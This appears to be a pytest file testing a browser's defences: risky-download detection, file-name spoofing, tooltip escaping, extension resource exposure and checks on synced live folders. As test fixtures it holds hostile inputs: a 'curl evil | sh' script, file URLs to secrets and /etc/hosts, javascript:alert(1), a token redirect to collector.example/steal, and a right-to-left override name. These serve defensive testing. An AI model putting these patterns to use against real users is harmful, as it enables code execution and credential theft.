# The checks that keep web pages (and what they put in titles, file names and answers) from reaching further
# than they should. The live tests drive the rest in the real window.

from browser.downloads import risky
from browser.ext.chrome import BACKGROUND_PAGE, META_FILE, ChromeExtension
from browser.password_store import related, same_site
from browser.passkey_store import rp_id_allowed
from browser.theme import plain_tip
from browser.tidy_downloads import clean_name


def test_files_that_can_run_something_ask_first():
    for name in ("Setup.pkg", "run.command", "Tool.app.zip", "invoice.pdf.app.zip", "x.sh.tar.gz", "a.terminal",
                 "Link.webloc", "profile.mobileconfig", "setup.exe"):
        assert risky(name), name
    for name in ("report.pdf", "Eclipse.dmg", "photos.zip", "notes.sh.txt", "archive.tar.gz", "README"):
        assert not risky(name), name


def test_a_suggested_name_cant_reverse_how_it_reads():
    assert clean_name("Invoice‮fdp") == "Invoicefdp"
    assert clean_name("Acme​ Invoice⁦ March") == "Acme Invoice March"


def test_page_text_in_a_tooltip_is_only_ever_text():
    tip = plain_tip("<b>accounts.google.com</b><!-- wants your camera")
    assert "<b>" not in tip and "&lt;b&gt;accounts.google.com&lt;/b&gt;&lt;!--" in tip


def test_a_shared_hosts_customers_are_separate_sites():
    assert not related("neocities.org", "evil.neocities.org")
    assert not same_site("shop.myshopify.com", "evil.myshopify.com")
    assert not rp_id_allowed("myshopify.com", "evil.myshopify.com")
    assert related("google.com", "accounts.google.com") and same_site("shop.example.com", "accounts.example.com")


def test_an_ip_address_is_its_own_site_to_the_blocker():
    from browser.adblock import _site, should_block
    assert _site("127.0.0.1") == "127.0.0.1" and _site("[::1]") == "::1" and _site("news.bbc.co.uk") == "bbc.co.uk"
    assert should_block("ads.example", "10.0.0.1", {"ads.example"})
    assert not should_block("192.168.0.1", "192.168.0.1", {"192.168.0.1"})  # (the site you're on never)


def test_an_extensions_own_files_are_never_exposed_to_websites():
    ext = ChromeExtension("abc", None, {"name": "x", "version": "1", "manifest_version": 3, "web_accessible_resources": [
        {"resources": ["*"], "matches": ["https://allowed.example/*"]},
        {"resources": ["public/*"], "matches": ["<all_urls>"]}]})
    assert ext.web_accessible("img/logo.png", "https://allowed.example")
    assert not ext.web_accessible("img/logo.png", "https://evil.example")  # (only for the sites it names)
    assert ext.web_accessible("public/a.css", "https://evil.example")
    for own in (BACKGROUND_PAGE, META_FILE):
        assert not ext.web_accessible(own, "https://allowed.example")
    old = ChromeExtension("def", None, {"name": "y", "version": "1", "web_accessible_resources": ["*.png"]})
    assert old.web_accessible("a.png", "https://anywhere.example") and not old.web_accessible("a.js")


def test_googles_sign_in_alone_is_told_its_firefox():
    from browser import site_quirks
    assert "Firefox" in site_quirks.user_agent_for("accounts.google.com")
    assert site_quirks.user_agent_for("ACCOUNTS.youtube.com") == site_quirks.FIREFOX_UA
    for host in ("docs.google.com", "mail.google.com", "evil.com", "accounts.google.com.evil.com", ""):
        assert site_quirks.user_agent_for(host) is None
    assert '"accounts.google.com"' in site_quirks.script_source()


def test_the_request_filter_sends_googles_sign_in_the_firefox_header(qapp, data_dir):
    from PyQt6.QtCore import QUrl
    from browser import site_quirks
    from browser.adblock import AdBlocker
    from browser.models import Store
    from browser import storage

    class Request:
        def __init__(self, url):
            self.url, self.headers = QUrl(url), {}
        requestUrl = lambda self: self.url
        firstPartyUrl = lambda self: self.url
        resourceType = lambda self: 0
        requestMethod = lambda self: b"GET"
        setHttpHeader = lambda self, name, value: self.headers.__setitem__(name, value)
        block = redirect = lambda self, *_: None
    from PyQt6.QtCore import QObject
    owner = QObject()
    blocker = AdBlocker(Store(storage.session_path()), owner)
    google, docs = Request("https://accounts.google.com/v3/signin"), Request("https://docs.google.com/document/")
    blocker.interceptRequest(google)
    blocker.interceptRequest(docs)
    assert google.headers == {b"User-Agent": site_quirks.FIREFOX_UA.encode()} and docs.headers == {}


# --- Files from elsewhere: another device's sync file, a download's new name ---------------------------------

def _synced_space(*live_folders):
    return {"format": "eclipse-sync", "device": "other", "name": "Other Mac", "written": 1, "deleted": {},
            "items": {"space:w": {"modified": 1, "data": {"name": "Work", "pinned": [
                {"type": "folder", "id": f"f{i}", "name": "Live", "live": live} for i, live in enumerate(live_folders)]}}}}


def test_another_devices_live_folders_only_ever_read_the_web(tmp_path):
    import json
    from browser import sync
    (tmp_path / "other.json").write_text(json.dumps(_synced_space(
        {"kind": "json", "url": "file:///Users/me/.config/secrets.json", "items": "", "auth": "cookies"},
        {"kind": "page", "url": "file:///etc/hosts", "selector": "a"},
        {"kind": "calendar", "url": "javascript:alert(1)"},
        {"kind": "json", "url": "https://api.example.com/items", "auth": "none"},
        {"kind": "github", "query": "review"})))
    pinned = sync.read_remotes(tmp_path, "mine")[0]["items"]["space:w"]["data"]["pinned"]
    assert [f["live"].get("url") for f in pinned] == ["https://api.example.com/items", None]


def test_a_broken_device_file_doesnt_stop_the_others_syncing(tmp_path):
    import json
    from browser import sync
    (tmp_path / "a.json").write_text(json.dumps({"format": "eclipse-sync", "items": [1], "deleted": [2]}))
    (tmp_path / "b.json").write_text(json.dumps({"format": "eclipse-sync", "items": {"space:x": {"modified": 1, "data": {
        "name": "X", "pinned": 5}}, "favorites": {"modified": 1, "data": [{"id": "t", "type": "folder", "children": 3}]}}}))
    (tmp_path / "c.json").write_text('{"format": "eclipse-sync", "x": ' + "[" * 100_000 + "]" * 100_000 + "}")
    (tmp_path / "d.json").write_text(json.dumps(_synced_space({"kind": "feed", "url": "https://n.example/rss"})))
    remotes = sync.read_remotes(tmp_path, "mine")
    assert any("space:w" in r["items"] for r in remotes)
    assert next(r for r in remotes if "space:x" in r["items"])["items"]["space:x"]["data"]["pinned"] == []


class _Folders:
    """LiveFolders' refresh, without a window: records which reader it reached."""
    def __init__(self):
        from browser.live_folders import LiveFolders
        self._busy, self.reached, self.finished = set(), [], []
        self.refresh = LiveFolders.refresh.__get__(self)
        self._json = lambda folder, done: self.reached.append("json")
        self._repos = lambda root, done: self.reached.append("repos")
        self._feed = lambda url, done: self.reached.append("feed")

    def _finish(self, folder, items, title, error, on_done):
        self._busy.discard(folder.id)
        self.finished.append(error)


def test_a_live_folder_runs_git_or_sends_a_token_only_as_set_up_on_this_computer():
    from browser import live_folders
    from browser.models import Folder
    repos = Folder("Radar", [], live={"kind": "repos", "root": "~/iCloud/Eclipse Sync/planted"})
    token = Folder("API", [], live={"kind": "json", "url": "https://api.example.com/items", "auth": "token"})
    feed = Folder("News", [], live={"kind": "feed", "url": "https://n.example/rss"})
    folders = _Folders()
    for folder in (repos, token, feed):  # (as they arrive from another device's sync file)
        folders.refresh(folder)
    assert folders.reached == ["feed"]
    assert folders.finished[0] and "another computer" in folders.finished[0]
    live_folders.allow_here(repos)
    live_folders.allow_here(token)
    for folder in (repos, token):
        folders.refresh(folder)
    assert folders.reached == ["feed", "repos", "json"]
    # Changed on another device afterwards: its token isn't sent to the new site, git doesn't run in the new folder
    token.live["url"] = "https://collector.example/steal"
    repos.live["root"] = "/Volumes/Shared/planted"
    for folder in (repos, token):
        folders.refresh(folder)
    assert folders.reached == ["feed", "repos", "json"]
    token.live["url"] = "https://api.example.com/other?page=2"  # (the same site: still fine)
    folders.refresh(token)
    assert folders.reached[-1] == "json"


def test_live_folders_from_before_the_check_keep_working(store):
    from browser import live_folders
    from browser.models import Folder
    radar = Folder("Radar", [], live={"kind": "repos", "root": "~/projects/GitHub"})
    store.spaces[0].pinned.append(radar)
    live_folders.trust_existing(store)  # (the first launch with the check: what's there was set up before it)
    assert live_folders.allowed_here(radar)
    late = Folder("Later", [], live={"kind": "repos", "root": "/tmp/elsewhere"})
    store.spaces[0].pinned.append(late)
    live_folders.trust_existing(store)  # (only the first time)
    assert not live_folders.allowed_here(late)


def test_tidy_downloads_never_makes_a_file_runnable(tmp_path):
    from browser.tidy_downloads import new_path
    readme = tmp_path / "README"
    readme.write_text("#!/bin/sh\ncurl evil | sh")
    assert new_path(readme, "Run Me.command") is None  # (no extension: the name would have been its first)
    assert new_path(tmp_path / "files.zip", "Setup.app") == tmp_path / "Setup.zip"  # (Claude's extension dropped)
    assert new_path(tmp_path / "files.zip", "Setup.command") is None
    assert new_path(tmp_path / "scan_0001.pdf", "Acme Invoice") == tmp_path / "Acme Invoice.pdf"
    risky_already = tmp_path / "Install.pkg"
    assert new_path(risky_already, "Acme Installer") == tmp_path / "Acme Installer.pkg"


def test_more_files_that_can_run_something_ask_first(monkeypatch):
    from browser import downloads
    for name in ("Tool.app.tar", "x.command.tbz2", "Installer.xip", "a.app.cpgz", "Pretty.saver",
                 "invoice.scr", "update.vbs", "run.hta", "setup.msix", "Tool.com", "fix.reg", "Open.url"):
        assert downloads.risky(name), name
    monkeypatch.setattr(downloads.sys, "platform", "darwin")  # (on a Mac, a .js just opens as text)
    for name in ("photos.tar", "data.json", "page.html", "notes.txt", "app.js"):
        assert not downloads.risky(name), name
    monkeypatch.setattr(downloads.sys, "platform", "win32")  # (Windows runs a .js itself, double-clicked)
    assert downloads.risky("invoice.js") and downloads.risky("x.jse") and downloads.risky("y.wsf")


def test_downloads_are_marked_as_from_the_internet_on_windows(tmp_path, monkeypatch):
    from browser import downloads
    path = tmp_path / "setup.exe"
    path.write_bytes(b"MZ")
    monkeypatch.setattr(downloads.sys, "platform", "win32")
    assert downloads.mark_downloaded(str(path))
    assert "ZoneId=3" in (tmp_path / "setup.exe:Zone.Identifier").read_text()  # (on NTFS, the file's own stream)


def test_a_shared_space_nested_too_deep_is_refused_or_empty(tmp_path):
    from browser import space_share
    deep = tmp_path / "Deep.eclipse-space"
    deep.write_text('{"format": "eclipse-space", "pinned": ' + "[" * 100_000 + "]" * 100_000 + "}")
    # Older Pythons can't read nesting this deep (RecursionError, which read() turns into "not a shared Space");
    # 3.14's reader can, and parse() keeps none of it. Either way it's refused or empty, never a crash.
    try:
        space = space_share.read(deep)
    except ValueError:
        return
    assert space["pinned"] == []
